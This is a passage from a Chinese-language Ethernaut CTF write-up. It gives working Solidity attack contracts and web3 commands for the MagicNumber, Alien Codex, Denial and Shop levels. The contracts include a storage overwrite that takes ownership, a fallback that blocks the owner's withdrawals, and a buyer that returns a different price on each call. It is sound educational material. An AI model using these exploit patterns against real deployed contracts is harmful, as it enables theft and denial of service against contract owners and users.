    SimpleToken constant private target = SimpleToken(0xDDdA39DcB8bB61Aee73631f83F0068A99bD0b7Dd);
    function attack() public {
        target.destroy(payable(msg.sender));
    }
}
```

看了别的师傅的WP，这个创建的合约的地址还能算出来。。。。离谱。。。。这方法我就不试了，太懒了。。

# MagicNumber

> To solve this level, you only need to provide the Ethernaut with a "Solver", a contract that responds to "whatIsTheMeaningOfLife()" with the right number.
> Easy right? Well... there's a catch.
> The solver's code needs to be really tiny. Really reaaaaaallly tiny. Like freakin' really really itty-bitty tiny: 10 opcodes at most.
> Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That's right: Raw EVM bytecode.
> Good luck!

需要让solver是一个合约，这个合约的`whatIsTheMeaningOfLife()`函数会返回一个正确的数字，而且这个函数的opcode不能超过10个，正常写的话是会超过的，所以要自己手写opcode。
学习文章，虽然是英文，但是写的确实很好，认真阅读就可以理解：
[Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2)
[MagicNumber](https://github.com/r1oga/ethernaut#MagicNumber)

差不多算是2种思路了，其实最终的原理都差不多。Initialization Opcodes的作用就是：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210416100553162.png)
因为我们没必要写constructor，因此这部分的opcode就没有了，只需要有把runtime opcode这部分存储到memory这部分所需要的opcode就可以了，然后是2种思路，一种就是利用codecopy：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210416100852918.png)
或者就是直接return。

用codecopy的话就是这样：

```javascript
Runtime Opcodes
602a   
6080   
52      
6020
6080
f3


Initialization Opcodes
600a
600c
6000
39
600a
6000
f3
```

另外一种return的就不写了，参考上面的文章即可。

```javascript
await web3.eth.sendTransaction({from:player,data:"0x600a600c600039600a6000f3602a60805260206080f3"}, function(err,res){console.log(res)})
await contract.setSolver("0x067Cb3Ec131555289AC6C12cF702f121d080e1E1");
```

学习了一波，感觉对于opcode的理解更深了。

# Alien Codex

Storage的Arbitrary Writing，参考我之前写的文章：
[Storage](https://blog.csdn.net/rfrder/article/details/115706983)
slot0放的是owner和contact，算出可以覆盖的i值，然后覆盖掉就可以了。
POC：

```javascript
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

interface AlienCodex {

  function make_contact() external ;

  function record(bytes32 _content) external ;

  function retract()  external ;

  function revise(uint i, bytes32 _content) external ;
}

contract Feng {
    AlienCodex constant private target = AlienCodex(0x53c5A404b93e96DA6b913c222b728E8825f987E5);
    bytes32 public payload = 0x0000000000000000000000017D11f36fA2FD9B7A4069650Cd8A2873999263FB8;
    function attack() public {
        target.make_contact();
        target.retract();
        uint i = 2**256 - 1 - uint(keccak256(abi.encodePacked(uint(1)))) +1;
        target.revise(i, payload);
    }
}
```

# Denial

从github的wp上摘录下来的。

|            |                                    |                                                              |                                                           |                                                           |
| ---------- | ---------------------------------- | ------------------------------------------------------------ | --------------------------------------------------------- | --------------------------------------------------------- |
| expression | syntax                             | effect                                                       | OPCODE                                                    |                                                           |
| throw      | `if (condition) { throw; }`        | reverts all state changes and deplete gas                    | version<0.4.1: INVALID OPCODE - 0xfe, after: REVERT- 0xfd | deprecated in version 0.4.13 and removed in version 0.5.0 |
| assert     | `assert(condition);`               | reverts all state changes and depletes all gas               | INVALID OPCODE - 0xfe                                     |                                                           |
| revert     | `if (condition) { revert(value) }` | reverts all state changes, allows returning a value, refunds remaining gas to caller | REVERT - 0xfd                                             |                                                           |
| require    | `require(condition, "comment")`    | reverts all state changes, allows returning a value, refunds remaining gas to calle | REVERT - 0xfd                                             |                                                           |

这题很明显就是构造partner合约的fallback，让：

> If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) you will win this level.

这题我一开始还是学的不够好，solidity基础不扎实，因为基本上我自己不怎么区分require和assert这样的。上面的列表已经给出了，但其实上就是，拜占庭版本之前，require和assert确实区别不大，都是恢复状态，耗尽gas。而在拜占庭版本之后，require不再耗尽gas了，而是refunds remaining gas to calle。

回到这一题上：

```javascript
    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call.value(amountToSend)("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }
```

先是call，然后transfer，之所以我用require不行，就在于transfer里出现异常会回退，而call这样的出现异常会返回false，下面的仍然会执行，因此想让下面的transfer出错，就要把gas耗尽，因此要用assert而不能用require。POC：

```javascript
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

interface Denial {

    function setWithdrawPartner(address _partner) external ;

    // withdraw 1% to recipient and 1% to owner
    function withdraw() external ;
    // convenience function
    function contractBalance() external view returns (uint) ;
}

contract Feng {
    Denial constant private target = Denial(0x47D3b14124BC946e5D102367F92B653DCb36d14d);
    fallback() external payable{
        //assert(false);
        require(false);
    }
    constructor() public {
        target.setWithdrawPartner(address(this));
    }
}
```

# Shop

说白了就是自己的Buyer合约的price方法2次的返回值要不一样，第一次要大于等于100，第二次要小于100。我写了一下，但是一直有问题。。。还是我的问题，因为那个gas有3000的限制，不能访问storage：
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041616082015.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
可以通过isSold来判断，POC如下：

```javascript
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;
contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}
contract Buyer {
    bool public flag = false;
  function price() public view  returns (uint){
      if(Shop(msg.sender).isSold() == true){
          return 1;
      }else{
          return 110;
      }
  }
  function attack(address target) public {
      Shop(target).buy();
  }
}

```

不过我一开始写的有问题。。就是Buyer合约：

```javascript
contract Buyer {
    bool public flag = false;
    Shop public target = Shop(address(0xaA4431855E966C98007E17732E78d9feB7adf848));
  function price() public view  returns (uint){
      if(target.isSold() == true){
          return 1;
      }else{
          return 110;
      }
  }
  function attack() public {
      target.buy();
  }
}
```

attack函数那里，直接用target的话不行，会gas出问题。目前还不清楚是为什么。。。（想了一下想不明白为什么。。。）

